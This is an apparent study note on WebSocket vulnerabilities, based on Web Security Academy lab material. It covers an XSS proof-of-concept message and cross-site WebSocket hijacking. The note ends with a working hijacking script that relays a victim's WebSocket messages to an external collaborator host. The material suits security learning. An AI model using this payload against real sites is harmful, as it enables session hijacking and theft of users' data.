# WebSockets
#CSRF #CSWSH #HTTP-Headers #WebSockets 

WebSockets are widely used in modern web applications. They are initiated over **HTTP** and provide **long-lived connections** with **asynchronous** communication in both directions.

WebSockets are used for all kinds of purposes, including **performing user actions** and transmitting **sensitive** information. Virtually any web security vulnerability that arises with regular **HTTP** can also arise in relation to **WebSockets** communications

## Manipulating WebSocket Messages
The **majority** of input-based vulnerabilities affecting WebSockets can be found and exploited by [tampering with the contents of WebSocket messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages).

For example, suppose a **chat application** uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a **WebSocket** message like the following is sent to the server:
`{"message":"Hello Carlos"}`

The **contents** of the message are **transmitted** (again via WebSockets) to another chat user, and **rendered** in the user's browser as follows:
`<td>Hello Carlos</td>`

In this situation, provided no other **input processing** or **defenses** are in play, an attacker can perform a proof-of-concept **XSS** attack by submitting the following **WebSocket** message:
`{"message":"<img src=1 onerror='alert(1)'>"}`

## Cross-Site WebSocket Hijacking (CSWSH)
Cross-site WebSocket hijacking (also known as cross-origin WebSocket hijacking) involves a [[Cross-Site Request Forgery (CSRF)]] vulnerability on a **WebSocket handshake**. It arises when the WebSocket handshake request relies solely on HTTP **cookies** for session handling and does not contain any **CSRF tokens** or other **unpredictable** values.

An attacker can create a **malicious** web page on their **own domain** which establishes a cross-site WebSocket connection to the **vulnerable** application. The application will handle the connection in the context of the **victim user's session** with the application.

The attacker's page can then **send arbitrary messages** to the server via the connection and read the contents of messages that are received back from the server. This means that, unlike regular [[Cross-Site Request Forgery (CSRF)]], the attacker gains **two-way** interaction with the compromised application.

Example [[Cross-Site Request Forgery (CSRF)]] payload:
```html
<script>
    var ws = new WebSocket('wss://0a300013046fd308c0814cb7002900f0.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://m3qqgaxaj45edbaifmp9l0h62x8nwc.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```